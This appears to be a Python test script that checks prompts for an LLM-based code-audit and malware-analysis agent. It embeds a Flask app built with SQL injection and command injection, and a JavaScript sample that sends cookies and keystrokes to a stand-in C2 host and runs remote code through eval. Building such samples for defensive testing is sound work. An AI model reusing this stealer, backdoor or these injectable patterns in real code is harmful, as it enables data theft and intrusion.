"""
2.2.4 测试样本验证 Prompt 效果
"""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from app.agent.llm import LLMClient

# ---------------------------------------------------------------------------
# 测试样本1：Python SQL 注入代码
# ---------------------------------------------------------------------------
SQL_INJECTION_SAMPLE = '''
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route("/user/<username>")
def get_user(username):
    """Get user by username."""
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    return str(result)

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    # Password is stored in plaintext and query uses string formatting
    query = "SELECT * FROM users WHERE username='%s' AND password='%s'" % (username, password)
    cursor.execute(query)
    user = cursor.fetchone()
    conn.close()
    if user:
        return "Welcome, " + username
    return "Login failed"

@app.route("/search")
def search():
    keyword = request.args.get("q", "")
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products WHERE name LIKE '%" + keyword + "%'")
    results = cursor.fetchall()
    conn.close()
    return str(results)

@app.route("/admin/exec")
def admin_exec():
    cmd = request.args.get("cmd", "")
    import os
    os.system("ping " + cmd)
    return "OK"

if __name__ == "__main__":
    app.run(debug=True)
'''

# ---------------------------------------------------------------------------
# 测试样本2：恶意 JavaScript 代码
# ---------------------------------------------------------------------------
MALICIOUS_JS_SAMPLE = '''
// This is a suspicious script found in an email attachment
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://evil-c2.example.com/collect", true);
xhr.setRequestHeader("Content-Type", "application/json");

// Collect browser data
var data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
};

xhr.send(JSON.stringify(data));

// Keylogger
document.addEventListener("keydown", function(e) {
    var keys = [];
    keys.push(e.key);
    // Send keystrokes every 50 characters
    if (keys.length > 50) {
        var kxhr = new XMLHttpRequest();
        kxhr.open("POST", "https://evil-c2.example.com/keys", true);
        kxhr.send(JSON.stringify({keys: keys.join("")}));
        keys = [];
    }
});

// Create backdoor via WebSocket
var ws = new WebSocket("wss://evil-c2.example.com/ws");
ws.onmessage = function(e) {
    var cmd = JSON.parse(e.data);
    eval(cmd.code);  // Execute arbitrary code from C2
};
'''

# ---------------------------------------------------------------------------
# 测试
# ---------------------------------------------------------------------------
def test_code_audit():
    print("=" * 60)
    print("测试1：代码漏洞检测 — Python SQL 注入样本")
    print("=" * 60)

    prompt_path = os.path.join(os.path.dirname(__file__), "prompts", "code_audit.txt")
    with open(prompt_path, "r", encoding="utf-8") as f:
        system_prompt = f.read()

    client = LLMClient(max_tokens=2048, max_input_tokens=8000)

    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": f"请分析以下 Python 代码的安全问题：\n\n```python\n{SQL_INJECTION_SAMPLE}\n```"}
    ]

    result = client.chat(messages)

    if result["error"]:
        print(f"ERROR: {result['error']}")
        return None

    print(f"Model: {result['model']}")
    print(f"Finish: {result['finish_reason']}")
    print(f"Tokens: {result['usage']}")
    print(f"\n--- LLM 回复 (content part) ---\n")
    if result["content"]:
        print(result["content"][:3000])
    else:
        print("(无 content，LLM 可能只返回了 tool_calls)")

    if result["tool_calls"]:
        print(f"\n--- Tool Calls ({len(result['tool_calls'])} 个) ---")
        for tc in result["tool_calls"]:
            print(f"  -> {tc['name']}({tc['arguments']})")

    print(f"\n累计 Token 消耗: {client.total_usage}")
    return result


def test_malware_analysis():
    print("\n" + "=" * 60)
    print("测试2：恶意代码分析 — JavaScript 信息窃取样本")
    print("=" * 60)

    prompt_path = os.path.join(os.path.dirname(__file__), "prompts", "malware_analysis.txt")
    with open(prompt_path, "r", encoding="utf-8") as f:
        system_prompt = f.read()

    client = LLMClient(max_tokens=2048, max_input_tokens=8000)

    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": f"请分析以下可疑 JavaScript 文件的安全性：\n\n```javascript\n{MALICIOUS_JS_SAMPLE}\n```\n\n注意：请基于代码内容进行分析，假设 extract_file_features、extract_iocs、query_threat_intel 等工具暂时不可用，直接使用你的语义分析能力进行判定。"}
    ]

    result = client.chat(messages)

    if result["error"]:
        print(f"ERROR: {result['error']}")
        return None

    print(f"Model: {result['model']}")
    print(f"Finish: {result['finish_reason']}")
    print(f"Tokens: {result['usage']}")
    print(f"\n--- LLM 回复 (content part) ---\n")
    if result["content"]:
        print(result["content"][:3000])
    else:
        print("(无 content)")

    if result["tool_calls"]:
        print(f"\n--- Tool Calls ({len(result['tool_calls'])} 个) ---")
        for tc in result["tool_calls"]:
            print(f"  -> {tc['name']}({tc['arguments']})")

    print(f"\n累计 Token 消耗: {client.total_usage}")
    return result


if __name__ == "__main__":
    r1 = test_code_audit()
    r2 = test_malware_analysis()

    print("\n" + "=" * 60)
    print("Test Complete")
    print("=" * 60)
    if r1 and r2:
        print("[PASS] Both prompts work correctly")
    elif r1:
        print("[WARN] code_audit passed, malware_analysis failed")
    elif r2:
        print("[WARN] code_audit failed, malware_analysis passed")
    else:
        print("[FAIL] Both prompts failed")
